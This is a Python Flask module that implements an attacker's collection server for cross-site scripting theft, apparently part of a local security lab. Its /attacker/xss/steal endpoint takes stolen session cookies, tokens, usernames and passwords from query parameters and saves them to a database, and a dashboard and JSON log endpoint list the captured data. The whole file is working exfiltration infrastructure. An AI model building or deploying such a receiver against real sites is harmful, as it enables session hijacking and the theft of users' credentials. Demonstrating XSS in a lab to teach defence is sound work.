from flask_cors import CORS, cross_origin
import psycopg2
from flask import Blueprint, request, jsonify, render_template
import db

attacker = Blueprint('attacker', __name__, template_folder='../templates', static_folder='../static')
CORS(attacker, origins=["http://localhost:8080"])

def get_db_connection():
    return db.get_db()

@attacker.route('/attacker', methods=['GET'])
@attacker.route('/attacker/', methods=['GET'])
def attacker_page():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT id, cookie, token, stolen_at FROM stolen_cookies ORDER BY stolen_at DESC;")
        cookies = cur.fetchall()
        cur.execute("SELECT id, username, password, stolen_at FROM stolen_credentials ORDER BY stolen_at DESC;")
        credentials = cur.fetchall()
        cur.close()
        conn.close()
        return render_template("main.html", cookies=cookies, credentials=credentials)
    except Exception as e:
        print(f"[ERROR] Ошибка базы данных: {str(e)}")
        return render_template("main.html", error=f"Ошибка базы данных: {str(e)}")

@attacker.route('/attacker/logs', methods=['GET'])
def get_stolen_cookies():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT id, cookie, token, stolen_at FROM stolen_cookies ORDER BY stolen_at DESC;")
        cookies = cur.fetchall()
        cur.execute("SELECT id, username, password, stolen_at FROM stolen_credentials ORDER BY stolen_at DESC;")
        credentials = cur.fetchall()
        cur.close()
        conn.close()

        return jsonify({
            "stolen_cookies": [{"id": row[0], "cookie": row[1], "token": row[2], "stolen_at": str(row[3])} for row in cookies],
            "stolen_credentials": [{"id": row[0], "username": row[1], "password": row[2], "stolen_at": str(row[3])} for row in credentials]
        })
    except Exception as e:
        print(f"[ERROR] Ошибка базы данных: {str(e)}")
        return jsonify({"error": f"Ошибка базы данных: {str(e)}"}), 500

@attacker.route('/attacker/xss/steal', methods=['GET'])
@cross_origin(origins=["http://localhost:8080"])
def steal_cookies():
    stolen_cookie = request.args.get('cookie', None)
    stolen_token = request.args.get('token', None)
    username = request.args.get('username', None)
    password = request.args.get('password', None)

    # Если передан cookie, обрабатываем только куки и токен
    if stolen_cookie:
        print(f"[XSS COOKIE THEFT] Получен cookie: {stolen_cookie}, token: {stolen_token}")
        try:
            conn = get_db_connection()
            cur = conn.cursor()
            cur.execute("INSERT INTO stolen_cookies (cookie, token) VALUES (%s, %s)", (stolen_cookie, stolen_token))
            conn.commit()
            cur.close()
            conn.close()
        except Exception as e:
            print(f"Ошибка записи в БД: {str(e)}")
        return jsonify({"message": "Cookie stolen!"}), 200

    # Если переданы username и password, обрабатываем учетные данные
    if username and password:
        print(f"[XSS CREDENTIAL THEFT] Получены данные: username={username}, password={password}")
        try:
            conn = get_db_connection()
            cur = conn.cursor()
            cur.execute("INSERT INTO stolen_credentials (username, password) VALUES (%s, %s)", (username, password))
            conn.commit()
            cur.close()
            conn.close()
        except Exception as e:
            print(f"Ошибка записи в БД: {str(e)}")
        return jsonify({"message": "Credentials stolen!"}), 200

    # Если ничего не передано, возвращаем ошибку
    return jsonify({"error": "No cookie or credentials provided"}), 400